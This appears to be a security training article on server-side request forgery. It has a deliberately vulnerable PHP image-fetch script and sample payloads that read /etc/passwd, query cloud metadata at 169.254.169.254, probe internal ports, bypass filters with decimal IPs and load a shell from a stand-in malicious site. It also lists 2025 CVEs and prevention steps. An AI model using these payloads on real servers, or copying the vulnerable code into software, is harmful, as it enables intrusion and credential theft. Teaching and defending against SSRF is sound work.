# Server-Side Request Forgery (SSRF)

**Server-Side Request Forgery**
Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker manipulates a server-side application to make unauthorized HTTP requests to unintended locations, such as internal services or files. This exploits user-supplied URLs or inputs that the server fetches without proper validation, often bypassing firewalls or network restrictions.

Server-Side Request Forgery (SSRF) occurs when attackers trick servers into making unauthorized requests to internal or external resources, bypassing network protections like firewalls.

## SSRF Impacts
Server-Side Request Forgery (SSRF) allows attackers to exploit server-trusted requests, leading to severe consequences like data leaks and system compromise.

### Read Files from Affected Server
Attackers access local files using `file://` schemes, such as `file:///etc/passwd` on Linux or `file:///c:/windows/win.ini` on Windows, exposing credentials or configs. This bypasses direct file access restrictions since requests originate from the trusted server.

### Scan Local or External Networks
SSRF probes ports and services on internal networks via private IPs (e.g., `http://127.0.0.1:22`), mapping infrastructure without direct access. Time-based or DNS interactions reveal live hosts, aiding lateral movement.

### Interact with Internal Systems
Servers fetch data from non-routable back-ends like metadata services (e.g., AWS IMDS), extracting tokens or configs via `http://169.254.169.254`. This exploits trust relationships, enabling unauthorized API calls or database queries.

---

# SSRF Classifications

### Error-Based SSRF
*   Behavior changes based on existence of a resource:
    *   `200 OK` → resource exists
    *   `404 / 500` → resource does not exist
*   Used for:
    *   Internal path discovery
    *   Port scanning

### Boolean-Based SSRF
*   Script response differs slightly based on:
    *   Content size
    *   Response headers
    *   Output differences
*   Used when errors are suppressed.

### 3. Time-Based SSRF
Useful when output is identical for all responses.

**Example:**
*   Open port returns fast
*   Closed port returns slow
*   Filtered port hangs

**Timing differences help determine:**
*   Open/closed/filtered ports
*   Service behavior

---

# Vulnerable Code Analysis

**File: `ssrf.php`**

    
    <?php
    // SSRF VULNERABILITY: No input validation on $_GET['img_url']
    if (isset($_GET['img_url'])){
    
        $url = $_GET['img_url']; // Direct user input -> SSRF risk
    
        // # VULNERABLE: fopen() fetches ANY URL (http, file://, internal IPs) if allow_url_fopen=On
        $file = fopen($url, 'rb'); // Supports http://, https://, file://, localhost, private IPs
    
        // # Misleading: Always sends image/png header regardless of actual content
        header("Content-Type: image/png"); // CONTENT-BASED SSRF: Response reveals internal data
    
        // # Streams back whatever was fetched - images, HTML, /etc/passwd, phpinfo()
        fpassthru($file); // Attacker sees raw response from internal services
    
    }
    
    // Fallback message when no img_url provided
    echo "Please enter image url";
    ?>


---

# Advanced Exploitation & Trends

### Remote Code Execution (RCE)
*   Chained SSRF triggers RCE by hitting vulnerable internal endpoints or uploading shells via exploited proxies. Recent cases like **CVE-2025-61882** in Oracle EBS demonstrate pre-auth RCE through SSRF plus CRLF injection.

### Common Attack Examples
*   Accessing localhost admin pages: `?page=http://127.0.0.1/admin` to exploit trust in local requests.
*   Loading remote malicious content: `?page=https://malicioussite.com/shell.php`.
*   Bypassing filters with IP variants like `2130706433` (decimal for `127.0.0.1`).

### Recent Trends (2025)
SSRF attacks surged **452%** from 2023 to 2024, fueled by AI automation tools that generate bypass payloads and target cloud metadata services. Coordinated exploits hit multiple CVEs simultaneously across 400+ IPs, often chaining with path traversal for footholds.

### Notable 2025 Vulnerabilities

| CVE | Product | Impact | Disclosure |
| :--- | :--- | :--- | :--- |
| **CVE-2025-61882** | Oracle EBS 12.2.3-12.2.14 | Pre-auth RCE via SSRF + CRLF | Oct 2025 |
| **CVE-2025-20388** | Unspecified | Blind SSRF exposing networks | Dec 2025 |
| **CVE-2025-27888** | Apache Druid <31.0.2/32.0.1 | SSRF via proxy URL parsing | Sep 2025 |
| **CVE-2025-59088** | kdcproxy | SSRF via DNS discovery | Nov 2025 |

### Updated Prevention
Enforce allow lists for URLs, ports, and IPs; block private ranges and localhost variants like `127.1` or `2130706433`. Segment networks, disable HTTP redirects, and use behavioral detection over deny lists, as AI tools bypass signatures. Migrate cloud metadata to IMDSv2 equivalents for session auth.


# SSRF Payload Behavior & Analysis

### How the Payloads Behave

**1. Local image fetch**

    ?img_url=upload/1.png

The PHP script loads a local file from the server directory.

**2. External image fetch**

    ?img_url=https://www.armourinfosec.io/logo.png

Server fetches the image from the internet → works normally.

**3. HTTP fetch to a webpage**

    ?img_url=https://www.google.com/


The script expects an image, but receives HTML, which gets output as PNG content type → browser shows corrupt image / download.
> **Note:** This is evidence of SSRF functionality.

**4. Internal service discovery**
    
    ?img_url=http://127.0.0.1:80
    ?img_url=http://127.0.0.1:443
    ?img_url=http://192.168.1.6:80


These requests allow:
*   Port scanning
*   Internal service fingerprinting
*   Checking HTTP status differences (`200`/`500`/`404`)

**5. Local file read (LFI via stream wrapper)**
*   *Accessing local files using file wrappers.*

---

### Common SSRF-Prone PHP Functions

These functions create SSRF vectors when fed untrusted input:

| Function | SSRF Risk | Why |
| :--- | :--- | :--- |
| `fopen()` | **High** | Supports multiple wrappers (`http`, `file`, `php`, `ftp`) |
| `fread()` | **Medium** | Reads arbitrary data after `fopen()` |
| `fsockopen()` | **High** | Low-level socket → port scanning |
| `curl_exec()` | **High** | Follows redirects, supports most protocols |
| `file_get_contents()` | **High** | Same wrappers as `fopen()` |

---

### Test Setup

**Local Python server for internal service simulation:**

    python3 -m http.server --bind 127.0.0.1 8080

---

### Why is this vulnerable?

`fopen()` accepts any stream wrapper supported by PHP:
*   `http://`
*   `https://`
*   `ftp://`
*   `php://`
*   `file://`

This means the attacker can make the server request:
*   Internal network URLs
*   Local files (e.g., `file:///etc/passwd`)
